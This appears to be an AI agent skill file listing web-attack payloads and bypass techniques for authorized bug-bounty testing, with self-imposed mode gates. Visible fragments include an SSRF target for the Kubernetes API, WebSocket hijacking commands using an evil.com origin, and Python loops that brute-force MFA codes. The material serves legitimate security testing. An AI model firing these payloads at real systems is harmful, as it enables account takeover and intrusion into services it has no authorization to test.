...
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit. Trigger phrases include "/security-arsenal".
---

# SECURITY ARSENAL

These techniques are for **authorized, scoped, lawful security testing only** — systems you own,
a written bug-bounty scope, or a sanctioned engagement. Use `do:security-recon` for the
authorization gate before any active testing. Pair with `do:bb-methodology` for the hunting
workflow. Triage and validate a finding — impact, reproducibility, scope — before submitting it.

Under the `red-blue` orchestrator's **static** mode, treat anything here that implies an active step
— a payload, fuzzing, or an actual request — as a code-review checklist only; do not run it. An
active step needs `red-blue` **local-dynamic** mode against an authorized local target.

Payloads, bypass tables, wordlists, and submission rules.

---

## Two ways to read every entry — static signature vs active payload

Every payload block below carries two things, and which one you may use depends on the `red-blue` mode.

- **Static detection signature (always allowed).** The code or config shape the payload is meant to
  catch — read or grep for it, send nothing. A SQLi payload's signature is a query built by joining
  untrusted input; an SSRF payload's signature is a server-side fetch whose URL comes from input with
  no host allowlist; an XSS payload's signature is untrusted data reaching an HTML sink with no
  encoding. In `static` mode this is the ONLY way to use this file: turn each payload into "is the
  code open to this?" and answer by reading.
- **Active local-only payload (local-dynamic mode only).** The actual request to send. Allowed ONLY
  in `red-blue` local-dynamic mode against an authorized local target that passed the
  `do:security-recon` pre-flight — never against a remote, shared, or production host.

So: read the payload, work out its static signature, and look for that signature in the code first.
Send the live payload only after the local-target gate passes. The bypass tables and wordlists are
active material — they belong to the local-dynamic side; their static side is "does the code's filter
or allowlist already have this gap?"
...
http://10.96.0.1:443  # Kubernetes API server
```
...
# DNS rebinding: resolves to external on first check, internal on fetch
# Redirect chain: filter checks initial URL but follows redirects:
...
# [396] is Python-version-specific — enumerate __subclasses__() to find subprocess.Popen's real index first:
...
wscat -c "wss://$TARGET/ws" -H "Origin: null"
wscat -c "wss://$TARGET/ws" -H "Origin: https://$TARGET.evil.com"
```
...
secret = "BASE32SECRET"  # shared TOTP secret (from enrollment or a leak)
# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = pyotp.TOTP(secret).at(int(time.time()) + t_offset)
    r = requests.post("https://$TARGET/api/mfa", json={"otp": totp_value})
...
async def verify(session, otp):
    async with session.post("https://$TARGET/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()
...
Common wordlist paths (adjust to your environment):

```
~/wordlists/common.txt         # Common directories and files
~/wordlists/params.txt         # Parameter names (id, user_id, file, etc.)
~/wordlists/api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
~/wordlists/dirs.txt           # Directory names
~/wordlists/sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```
